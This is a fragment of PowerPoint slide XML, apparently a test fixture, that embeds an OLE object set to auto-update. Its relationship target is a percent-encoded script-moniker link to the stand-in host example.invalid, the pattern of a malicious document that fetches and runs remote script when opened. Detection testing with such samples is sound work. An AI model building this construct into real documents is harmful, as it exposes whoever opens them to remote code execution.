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oleObject" Target="%73cript:%68ttp://example.invalid/marker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graphicFrame>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
            <p:oleObj progId="Package" r:id="rId2">
              <p:link updateAutomatic="1"/>
            </p:oleObj>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
  </p:cSld>
</p:sld>
</file>